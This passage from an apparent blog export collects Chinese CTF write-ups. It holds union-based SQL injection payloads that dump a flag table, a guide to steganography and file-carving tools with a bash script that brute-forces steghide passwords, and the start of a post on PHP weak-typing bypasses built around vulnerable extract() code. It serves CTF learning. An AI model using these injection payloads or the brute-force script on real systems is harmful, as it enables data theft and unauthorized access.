src=\"https://img-blog.csdnimg.cn/20200407124035584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>出来了两个表。看到了flag的曙光。<br><strong>4.爆字段。</strong><br>payload:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407124334337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>5.爆值。</strong><br>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1 and 1&#x3D;2 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://img-blog.csdnimg.cn/20200407124507438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>这样就拿到了flag？就这？自己的注入还是太菜,还需要加强。</p>\n"},{"title":"kail做CTF杂项题的工具安利一波！","date":"2020-04-08T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp"],"_content":"\n\n\n﻿前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。\n\n## 1.blind-watermark\n这个工具主要是解决盲水印问题。\n[克隆到kail里](https://github.com/linyacool/blind-watermark.git)\n\n```\npython encode.py --image <image file> --watermark <watermark file> --result <result file>\n\npython decode.py --original <original image file> --image <image file> --result <result file>\n\nUse --alpha to change the alpha (default 5.0).\n```\n这个工具分为加密（encode）和解密（decode）两部分。\n原始文件，带有水印的文件，解出来的文件（或加密出来的文件）\n在看不懂我也没办法了。\n## 2.F5隐写\nF5隐写全称F5-steganography。\n1.kail安装命令：`git clone https://github.com/matthewgao/F5-steganography`\n2.进入F5-steganography文件夹，空白处打开命令终端。\n3.java Extract 图片的绝对路径/123456.jpg -p 123456\n**切记是绝对路径，并且  -p  后面是密码。**\n4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。\n## 3.outguess隐写\nkail终端命令输入 git clone https://github.com/crorvick/outguess 进行下载，下载完成后进入outguess文件夹，右击打开终端，\n执行命令./configure && make && make install 进行编译及安装。\noutguess -k '密钥' -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。\noutguess -k \"secret key\" -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。\n## 4.steghide工具\n如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。\n　　apt-get upgrade\n　　当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide\n　　如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。\n用法示例：\n将post.txt文件隐藏到xxx.jpg中：\nsteghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）\n从xxx.jpg解出post.txt:\nsteghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）\nsteghide也可以用来爆破密码：\n需要shell脚本：`#bruteStegHide.sh \n\n>        #bruteStegHide.sh\n>        #!/bin/bash\n>     \n>     for line in `cat $2`;do\n>     steghide extract -sf $1 -p $line > /dev/null 2>&1\n>     if [[ $? -eq 0 ]];then\n>     echo 'password is: '$line\n>     exit\n>     fi\n>     done\n\n\n\n用法：\n       # ./bruteStegHide.sh test.jpg passwd.txt\n       剩下的密码就出来了。\n## 5.文件分离工具（binwalk,foremost）\n1.binwalk的安装\n\n```\ngit clone https://github.com/devttys0/binwalk\ncd binwalk\npython setup.py install\n```\n运行命令：\n\n> binwalk -D \"archive:zip\" -D \"image:jpg\" hehe.jpg   可以直接分离文件\n\n也可以使用dd命令分离文件，如:`dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163`\n\n2、Binwalk的提取与分析\n\n2.1、固件扫描\n\n　　命令：binwalk firmware.bin      通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。\n\n2.2、提取文件\n\n　　命令：binwalk -e firmware.bin      选项“-e\"和“--extract\"用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。\n\n　　命令：binwalk -Me firmware.bin      选项“-M\"和“--matryoshka\"用于根据magic签名扫描结果进行递归提取，仅对\"-e\"和“--dd\"选项有效。\n\n　　命令：binwalk -Me -d 5 firmware.bin      选项“-d\"和“--depth=<int>\"用于限制递归提取深度，默认深度为8，仅当“-M\"选项存在时有效。\n\n　　命令   dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1\n\n2.3、显示完整的扫描结果\n\n　　命令：binwalk -I firmware.bin      选项\"-I\"和“--invalid\"用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。\n\n## 6.foremost的使用。\n1、foremost在kali linux已经预装。\n#apt-get install foremost\n\n2、然后看是否下载成功，输入\n\n> foremost -h\n\n会显示如下信息（已经翻译）\n\n```\n$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>] \n    [-b <size>] [-c <file>] [-o <dir>] [-i <file] \n\n-V  - 显示版权信息并退出\n-t  - 指定文件类型.  (-t jpeg,pdf ...) \n-d  -打开间接块检测 (针对UNIX文件系统) \n-i  - 指定输入文件 (默认为标准输入) \n-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) \n-w  - 向磁盘写入审计文件，不写入任何检测到的文件\n-o  - 设置输出目录 (默认为为输出)\n-c  - 设置配置文件 (默认为 foremost.conf)\n-q  - 启用快速模式. 在512字节边界执行搜索.\n-Q  - 启用安静模式. 禁用输出消息. \n-v  - 详细模式. 向屏幕上记录所有消息。\n\n```\nctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。\n\n最简单的使用方法就是将图片放进foremost目录下，输入命令：\n\n```\n foremost -i xxx.jpg\n```\n在目录下会出现一个output文件夹，分离出的结果会在里面。\n\n\n工具就说到这，后面肯定还会有！！！\n","source":"_posts/kail做CTF杂项题的工具安利一波！.md","raw":"---\ntitle: kail做CTF杂项题的工具安利一波！\ndate: 2020-04-08 15:04:05\ntags: kail\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(2).jpg.webp\n---\n\n\n\n﻿前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。\n\n## 1.blind-watermark\n这个工具主要是解决盲水印问题。\n[克隆到kail里](https://github.com/linyacool/blind-watermark.git)\n\n```\npython encode.py --image <image file> --watermark <watermark file> --result <result file>\n\npython decode.py --original <original image file> --image <image file> --result <result file>\n\nUse --alpha to change the alpha (default 5.0).\n```\n这个工具分为加密（encode）和解密（decode）两部分。\n原始文件，带有水印的文件，解出来的文件（或加密出来的文件）\n在看不懂我也没办法了。\n## 2.F5隐写\nF5隐写全称F5-steganography。\n1.kail安装命令：`git clone https://github.com/matthewgao/F5-steganography`\n2.进入F5-steganography文件夹，空白处打开命令终端。\n3.java Extract 图片的绝对路径/123456.jpg -p 123456\n**切记是绝对路径，并且  -p  后面是密码。**\n4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。\n## 3.outguess隐写\nkail终端命令输入 git clone https://github.com/crorvick/outguess 进行下载，下载完成后进入outguess文件夹，右击打开终端，\n执行命令./configure && make && make install 进行编译及安装。\noutguess -k '密钥' -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。\noutguess -k \"secret key\" -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。\n## 4.steghide工具\n如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。\n　　apt-get upgrade\n　　当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide\n　　如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。\n用法示例：\n将post.txt文件隐藏到xxx.jpg中：\nsteghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）\n从xxx.jpg解出post.txt:\nsteghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）\nsteghide也可以用来爆破密码：\n需要shell脚本：`#bruteStegHide.sh \n\n>        #bruteStegHide.sh\n>        #!/bin/bash\n>     \n>     for line in `cat $2`;do\n>     steghide extract -sf $1 -p $line > /dev/null 2>&1\n>     if [[ $? -eq 0 ]];then\n>     echo 'password is: '$line\n>     exit\n>     fi\n>     done\n\n\n\n用法：\n       # ./bruteStegHide.sh test.jpg passwd.txt\n       剩下的密码就出来了。\n## 5.文件分离工具（binwalk,foremost）\n1.binwalk的安装\n\n```\ngit clone https://github.com/devttys0/binwalk\ncd binwalk\npython setup.py install\n```\n运行命令：\n\n> binwalk -D \"archive:zip\" -D \"image:jpg\" hehe.jpg   可以直接分离文件\n\n也可以使用dd命令分离文件，如:`dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163`\n\n2、Binwalk的提取与分析\n\n2.1、固件扫描\n\n　　命令：binwalk firmware.bin      通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。\n\n2.2、提取文件\n\n　　命令：binwalk -e firmware.bin      选项“-e\"和“--extract\"用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。\n\n　　命令：binwalk -Me firmware.bin      选项“-M\"和“--matryoshka\"用于根据magic签名扫描结果进行递归提取，仅对\"-e\"和“--dd\"选项有效。\n\n　　命令：binwalk -Me -d 5 firmware.bin      选项“-d\"和“--depth=<int>\"用于限制递归提取深度，默认深度为8，仅当“-M\"选项存在时有效。\n\n　　命令   dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1\n\n2.3、显示完整的扫描结果\n\n　　命令：binwalk -I firmware.bin      选项\"-I\"和“--invalid\"用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。\n\n## 6.foremost的使用。\n1、foremost在kali linux已经预装。\n#apt-get install foremost\n\n2、然后看是否下载成功，输入\n\n> foremost -h\n\n会显示如下信息（已经翻译）\n\n```\n$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t <type>] [-s <blocks>] [-k <size>] \n    [-b <size>] [-c <file>] [-o <dir>] [-i <file] \n\n-V  - 显示版权信息并退出\n-t  - 指定文件类型.  (-t jpeg,pdf ...) \n-d  -打开间接块检测 (针对UNIX文件系统) \n-i  - 指定输入文件 (默认为标准输入) \n-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) \n-w  - 向磁盘写入审计文件，不写入任何检测到的文件\n-o  - 设置输出目录 (默认为为输出)\n-c  - 设置配置文件 (默认为 foremost.conf)\n-q  - 启用快速模式. 在512字节边界执行搜索.\n-Q  - 启用安静模式. 禁用输出消息. \n-v  - 详细模式. 向屏幕上记录所有消息。\n\n```\nctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。\n\n最简单的使用方法就是将图片放进foremost目录下，输入命令：\n\n```\n foremost -i xxx.jpg\n```\n在目录下会出现一个output文件夹，分离出的结果会在里面。\n\n\n工具就说到这，后面肯定还会有！！！\n","slug":"kail做CTF杂项题的工具安利一波！","published":1,"updated":"2020-05-11T08:56:28.238Z","comments":1,"layout":"post","link":"","_id":"ckchhpsgp00079kq62qm5aiu6","content":"<p>﻿前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。</p>\n<h2 id=\"1-blind-watermark\"><a href=\"#1-blind-watermark\" class=\"headerlink\" title=\"1.blind-watermark\"></a>1.blind-watermark</h2><p>这个工具主要是解决盲水印问题。<br><a href=\"https://github.com/linyacool/blind-watermark.git\" target=\"_blank\" rel=\"noopener\">克隆到kail里</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python encode.py --image &lt;image file&gt; --watermark &lt;watermark file&gt; --result &lt;result file&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">python decode.py --original &lt;original image file&gt; --image &lt;image file&gt; --result &lt;result file&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Use --alpha to change the alpha (default 5.0).</span><br></pre></td></tr></table></figure>\n<p>这个工具分为加密（encode）和解密（decode）两部分。<br>原始文件，带有水印的文件，解出来的文件（或加密出来的文件）<br>在看不懂我也没办法了。</p>\n<h2 id=\"2-F5隐写\"><a href=\"#2-F5隐写\" class=\"headerlink\" title=\"2.F5隐写\"></a>2.F5隐写</h2><p>F5隐写全称F5-steganography。<br>1.kail安装命令：<code>git clone https://github.com/matthewgao/F5-steganography</code><br>2.进入F5-steganography文件夹，空白处打开命令终端。<br>3.java Extract 图片的绝对路径/123456.jpg -p 123456<br><strong>切记是绝对路径，并且  -p  后面是密码。</strong><br>4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。</p>\n<h2 id=\"3-outguess隐写\"><a href=\"#3-outguess隐写\" class=\"headerlink\" title=\"3.outguess隐写\"></a>3.outguess隐写</h2><p>kail终端命令输入 git clone <a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\">https://github.com/crorvick/outguess</a> 进行下载，下载完成后进入outguess文件夹，右击打开终端，<br>执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。<br>outguess -k ‘密钥’ -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。<br>outguess -k “secret key” -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。</p>\n<h2 id=\"4-steghide工具\"><a href=\"#4-steghide工具\" class=\"headerlink\" title=\"4.steghide工具\"></a>4.steghide工具</h2><p>如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。<br>　　apt-get upgrade<br>　　当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide<br>　　如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。<br>用法示例：<br>将post.txt文件隐藏到xxx.jpg中：<br>steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）<br>从xxx.jpg解出post.txt:<br>steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）<br>steghide也可以用来爆破密码：<br>需要shell脚本：`#bruteStegHide.sh </p>\n<blockquote>\n<pre><code>   #bruteStegHide.sh\n   #!/bin/bash\n\nfor line in `cat $2`;do\nsteghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1\nif [[ $? -eq 0 ]];then\necho &apos;password is: &apos;$line\nexit\nfi\ndone</code></pre></blockquote>\n<p>用法：<br>       # ./bruteStegHide.sh test.jpg passwd.txt<br>       剩下的密码就出来了。</p>\n<h2 id=\"5-文件分离工具（binwalk-foremost）\"><a href=\"#5-文件分离工具（binwalk-foremost）\" class=\"headerlink\" title=\"5.文件分离工具（binwalk,foremost）\"></a>5.文件分离工具（binwalk,foremost）</h2><p>1.binwalk的安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk</span><br><span class=\"line\">cd binwalk</span><br><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n<p>运行命令：</p>\n<blockquote>\n<p>binwalk -D “archive:zip” -D “image:jpg” hehe.jpg   可以直接分离文件</p>\n</blockquote>\n<p>也可以使用dd命令分离文件，如:<code>dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163</code></p>\n<p>2、Binwalk的提取与分析</p>\n<p>2.1、固件扫描</p>\n<p>　　命令：binwalk firmware.bin      通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。</p>\n<p>2.2、提取文件</p>\n<p>　　命令：binwalk -e firmware.bin      选项“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</p>\n<p>　　命令：binwalk -Me firmware.bin      选项“-M”和“–matryoshka”用于根据magic签名扫描结果进行递归提取，仅对”-e”和“–dd”选项有效。</p>\n<p>　　命令：binwalk -Me -d 5 firmware.bin      选项“-d”和“–depth=<int>“用于限制递归提取深度，默认深度为8，仅当“-M”选项存在时有效。</p>\n<p>　　命令   dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1</p>\n<p>2.3、显示完整的扫描结果</p>\n<p>　　命令：binwalk -I firmware.bin      选项”-I”和“–invalid”用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。</p>\n<h2 id=\"6-foremost的使用。\"><a href=\"#6-foremost的使用。\" class=\"headerlink\" title=\"6.foremost的使用。\"></a>6.foremost的使用。</h2><p>1、foremost在kali linux已经预装。<br>#apt-get install foremost</p>\n<p>2、然后看是否下载成功，输入</p>\n<blockquote>\n<p>foremost -h</p>\n</blockquote>\n<p>会显示如下信息（已经翻译）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] </span><br><span class=\"line\">    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] </span><br><span class=\"line\"></span><br><span class=\"line\">-V  - 显示版权信息并退出</span><br><span class=\"line\">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class=\"line\">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class=\"line\">-i  - 指定输入文件 (默认为标准输入) </span><br><span class=\"line\">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class=\"line\">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class=\"line\">-o  - 设置输出目录 (默认为为输出)</span><br><span class=\"line\">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class=\"line\">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class=\"line\">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class=\"line\">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure>\n<p>ctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。</p>\n<p>最简单的使用方法就是将图片放进foremost目录下，输入命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foremost -i xxx.jpg</span><br></pre></td></tr></table></figure>\n<p>在目录下会出现一个output文件夹，分离出的结果会在里面。</p>\n<p>工具就说到这，后面肯定还会有！！！</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。</p>\n<h2 id=\"1-blind-watermark\"><a href=\"#1-blind-watermark\" class=\"headerlink\" title=\"1.blind-watermark\"></a>1.blind-watermark</h2><p>这个工具主要是解决盲水印问题。<br><a href=\"https://github.com/linyacool/blind-watermark.git\" target=\"_blank\" rel=\"noopener\">克隆到kail里</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python encode.py --image &lt;image file&gt; --watermark &lt;watermark file&gt; --result &lt;result file&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">python decode.py --original &lt;original image file&gt; --image &lt;image file&gt; --result &lt;result file&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Use --alpha to change the alpha (default 5.0).</span><br></pre></td></tr></table></figure>\n<p>这个工具分为加密（encode）和解密（decode）两部分。<br>原始文件，带有水印的文件，解出来的文件（或加密出来的文件）<br>在看不懂我也没办法了。</p>\n<h2 id=\"2-F5隐写\"><a href=\"#2-F5隐写\" class=\"headerlink\" title=\"2.F5隐写\"></a>2.F5隐写</h2><p>F5隐写全称F5-steganography。<br>1.kail安装命令：<code>git clone https://github.com/matthewgao/F5-steganography</code><br>2.进入F5-steganography文件夹，空白处打开命令终端。<br>3.java Extract 图片的绝对路径/123456.jpg -p 123456<br><strong>切记是绝对路径，并且  -p  后面是密码。</strong><br>4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。</p>\n<h2 id=\"3-outguess隐写\"><a href=\"#3-outguess隐写\" class=\"headerlink\" title=\"3.outguess隐写\"></a>3.outguess隐写</h2><p>kail终端命令输入 git clone <a href=\"https://github.com/crorvick/outguess\" target=\"_blank\" rel=\"noopener\">https://github.com/crorvick/outguess</a> 进行下载，下载完成后进入outguess文件夹，右击打开终端，<br>执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。<br>outguess -k ‘密钥’ -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。<br>outguess -k “secret key” -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。</p>\n<h2 id=\"4-steghide工具\"><a href=\"#4-steghide工具\" class=\"headerlink\" title=\"4.steghide工具\"></a>4.steghide工具</h2><p>如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。<br>　　apt-get upgrade<br>　　当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide<br>　　如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。<br>用法示例：<br>将post.txt文件隐藏到xxx.jpg中：<br>steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）<br>从xxx.jpg解出post.txt:<br>steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）<br>steghide也可以用来爆破密码：<br>需要shell脚本：`#bruteStegHide.sh </p>\n<blockquote>\n<pre><code>   #bruteStegHide.sh\n   #!/bin/bash\n\nfor line in `cat $2`;do\nsteghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1\nif [[ $? -eq 0 ]];then\necho &apos;password is: &apos;$line\nexit\nfi\ndone</code></pre></blockquote>\n<p>用法：<br>       # ./bruteStegHide.sh test.jpg passwd.txt<br>       剩下的密码就出来了。</p>\n<h2 id=\"5-文件分离工具（binwalk-foremost）\"><a href=\"#5-文件分离工具（binwalk-foremost）\" class=\"headerlink\" title=\"5.文件分离工具（binwalk,foremost）\"></a>5.文件分离工具（binwalk,foremost）</h2><p>1.binwalk的安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalk</span><br><span class=\"line\">cd binwalk</span><br><span class=\"line\">python setup.py install</span><br></pre></td></tr></table></figure>\n<p>运行命令：</p>\n<blockquote>\n<p>binwalk -D “archive:zip” -D “image:jpg” hehe.jpg   可以直接分离文件</p>\n</blockquote>\n<p>也可以使用dd命令分离文件，如:<code>dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163</code></p>\n<p>2、Binwalk的提取与分析</p>\n<p>2.1、固件扫描</p>\n<p>　　命令：binwalk firmware.bin      通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。</p>\n<p>2.2、提取文件</p>\n<p>　　命令：binwalk -e firmware.bin      选项“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。</p>\n<p>　　命令：binwalk -Me firmware.bin      选项“-M”和“–matryoshka”用于根据magic签名扫描结果进行递归提取，仅对”-e”和“–dd”选项有效。</p>\n<p>　　命令：binwalk -Me -d 5 firmware.bin      选项“-d”和“–depth=<int>“用于限制递归提取深度，默认深度为8，仅当“-M”选项存在时有效。</p>\n<p>　　命令   dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1</p>\n<p>2.3、显示完整的扫描结果</p>\n<p>　　命令：binwalk -I firmware.bin      选项”-I”和“–invalid”用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。</p>\n<h2 id=\"6-foremost的使用。\"><a href=\"#6-foremost的使用。\" class=\"headerlink\" title=\"6.foremost的使用。\"></a>6.foremost的使用。</h2><p>1、foremost在kali linux已经预装。<br>#apt-get install foremost</p>\n<p>2、然后看是否下载成功，输入</p>\n<blockquote>\n<p>foremost -h</p>\n</blockquote>\n<p>会显示如下信息（已经翻译）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] </span><br><span class=\"line\">    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] </span><br><span class=\"line\"></span><br><span class=\"line\">-V  - 显示版权信息并退出</span><br><span class=\"line\">-t  - 指定文件类型.  (-t jpeg,pdf ...) </span><br><span class=\"line\">-d  -打开间接块检测 (针对UNIX文件系统) </span><br><span class=\"line\">-i  - 指定输入文件 (默认为标准输入) </span><br><span class=\"line\">-a  - 写入所有的文件头部, 不执行错误检测(损坏文件) </span><br><span class=\"line\">-w  - 向磁盘写入审计文件，不写入任何检测到的文件</span><br><span class=\"line\">-o  - 设置输出目录 (默认为为输出)</span><br><span class=\"line\">-c  - 设置配置文件 (默认为 foremost.conf)</span><br><span class=\"line\">-q  - 启用快速模式. 在512字节边界执行搜索.</span><br><span class=\"line\">-Q  - 启用安静模式. 禁用输出消息. </span><br><span class=\"line\">-v  - 详细模式. 向屏幕上记录所有消息。</span><br></pre></td></tr></table></figure>\n<p>ctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。</p>\n<p>最简单的使用方法就是将图片放进foremost目录下，输入命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foremost -i xxx.jpg</span><br></pre></td></tr></table></figure>\n<p>在目录下会出现一个output文件夹，分离出的结果会在里面。</p>\n<p>工具就说到这，后面肯定还会有！！！</p>\n"},{"title":"PHP弱类型及绕过方式（一）","date":"2020-05-03T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(5).jpg.webp"],"_content":"\n\n\n﻿前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。\n  *目录：\n    0×01.extract函数变量覆盖\n    0×02.strcmp函数数组漏洞\n    0×03.urldecode二次密码绕过\n    0×04.md5函数加密\n    0×05.sha()函数比较绕过\n    0×06.数组返回NULL绕过\n    0×07.弱类型整数大小比较绕过*\n    \n\n以下题目来源BugkuCTF\n\n**0×01.extract函数变量覆盖**\n\n```\n<?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\nif($shiyan==$content)\n{\necho'flag{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}\n?>\n```\n里面有很多函数是我没见过的，先了解一下。\n\nextract() 函数从数组中将变量导入到当前的符号表。\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。\n漏洞：![在这里插入图片描述](https://img-blog.csdnimg.cn/20200503114734560.png)\n\n\nisset() 函数用于检测变量是否已设置并且非 NULL。\n如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。\n若使用 isset() 测试一个被设置成 NULL 的变量，将返回 